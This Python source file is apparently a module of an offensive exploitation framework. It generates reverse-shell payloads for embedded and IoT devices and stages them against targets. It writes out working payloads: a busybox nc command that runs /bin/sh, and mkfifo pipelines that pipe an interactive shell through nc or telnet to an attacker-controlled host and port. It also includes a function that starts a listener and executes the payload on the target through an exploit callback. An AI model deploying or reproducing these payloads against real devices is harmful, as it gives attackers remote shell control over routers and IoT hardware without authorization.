"""Wireless/IoT-specific shell staging mixin.

Extends xpl-core shell infrastructure with embedded/IoT payloads:
busybox nc, mkfifo, socat (limited shell targets), MIPS/ARM payloads.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""


import threading
import time
from typing import Any

from xpl_core.shells import (
    ReverseListener,
    SessionManager,
    generate_payload,
)

_session_mgr = SessionManager()

WIRELESS_SHELL_TYPES = (
    "busybox_nc",
    "mkfifo",
    "socat",
    "bash",
    "python",
    "awk",
    "telnet_reverse",
)


def _wireless_payload(shell_type: str, lhost: str, lport: int) -> str:
    """Generate IoT/embedded-specific payloads."""
    t = shell_type.lower().strip()

    if t == "busybox_nc":
        return f"busybox nc {lhost} {lport} -e /bin/sh"

    if t == "mkfifo":
        return (
            "rm -f /tmp/.f; mkfifo /tmp/.f; "
            f"cat /tmp/.f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/.f"
        )

    if t == "telnet_reverse":
        return (
            "rm -f /tmp/.f; mkfifo /tmp/.f; "
            f"cat /tmp/.f | /bin/sh -i 2>&1 | telnet {lhost} {lport} > /tmp/.f"
        )

    return generate_payload(t, lhost, lport)


def get_session_manager() -> SessionManager:
    return _session_mgr


def spawn_wireless_shell(
    target: str,
    lhost: str,
    lport: int = 4444,
    shell_type: str = "busybox_nc",
    execute_fn: Any | None = None,
    timeout: int = 60,
) -> bool:
    """Spawn a reverse shell from a wireless/IoT exploit."""
    payload = _wireless_payload(shell_type, lhost, lport)
    if not payload:
        print(f"[-] [wireless-shell] Unknown shell type: '{shell_type}'")
        return False

    print(f"[*] [wireless-shell] Payload: {shell_type}")
    print(f"[*] [wireless-shell] Listener: {lhost}:{lport}")

    with ReverseListener(lhost, lport, timeout, pty_upgrade=True) as ln:
        if execute_fn is not None:
            def _exec() -> None:
                time.sleep(1)
                try:
                    execute_fn(payload)
                except Exception as exc:
                    print(f"[-] [wireless-shell] Execute: {exc}")

            t = threading.Thread(target=_exec, daemon=True)
            t.start()

        return ln.wait_for_connection()
